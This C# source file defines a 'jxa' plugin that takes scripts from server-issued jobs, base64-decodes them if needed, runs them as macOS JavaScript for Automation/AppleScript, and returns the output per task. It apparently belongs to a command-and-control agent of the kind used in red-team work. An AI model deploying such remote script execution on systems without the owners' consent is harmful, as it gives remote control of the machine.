using Workflow.Contracts;
using Workflow.Models;
using System.Runtime.InteropServices;
using System.Text;
using OSXIntegration.Framework;
using Workflow.Framework;
using System.Text.Json;
using jxa;
using System.Text.Json.Serialization;
using Workflow.Utilities;
namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "jxa";
        private IDataBroker messageManager { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            JxaArgs args = JsonSerializer.Deserialize<JxaArgs>(job.task.parameters);
            try
            {
                if (!string.IsNullOrEmpty(args.code))
                {
                    messageManager.WriteLine(AppleScript.Run(args.code), job.task.id, true);
                }
                else if (!string.IsNullOrEmpty(args.scriptcontents))
                {
                    messageManager.WriteLine(AppleScript.Run(Misc.Base64DecodeToByteArray(args.scriptcontents)), job.task.id, true);
                }
                else
                {
                    messageManager.WriteLine("No valid scripts provided", job.task.id, true);
                }
            }
            catch (Exception e)
            {
                messageManager.WriteLine(e.ToString(), job.task.id, true);
            }
        }
    }
}
